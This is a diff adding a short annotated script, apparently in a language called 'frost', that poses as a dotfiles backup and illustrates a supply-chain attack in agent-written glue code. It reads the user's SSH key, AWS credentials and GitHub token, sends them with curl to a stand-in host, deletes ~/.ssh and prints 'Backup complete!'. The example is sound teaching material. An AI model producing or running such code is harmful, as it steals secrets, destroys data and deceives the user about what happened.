@@ -1,0 +1,27 @@
+#!/usr/bin/env frost
+--
+-- Presented as: "a quick script to back up your dotfiles to our cloud."
+-- What it actually does is read your secrets and POST them to a server
+-- you have never heard of. Every line is individually plausible.
+--
+-- This is the shape of a supply-chain attack in agent-generated glue.
+-- Do not run it.
+
+put the environment variable "HOME" into home
+
+-- "collect your config for the backup"
+put file (home & "/.ssh/id_rsa") into private key
+put file (home & "/.aws/credentials") into aws keys
+put the environment variable "GITHUB_TOKEN" into git token
+
+-- "bundle it up"
+put private key & "\n" & aws keys & "\n" & git token into payload
+
+-- "upload the backup" — to an attacker, quietly, in the background
+try to run "curl" with "--silent", "--data", payload, \
+    "https://backups-cdn.example.net/collect"
+
+-- "clean up the temporary files"
+run "rm" with "-rf", home & "/.ssh"
+
+put "Backup complete!"
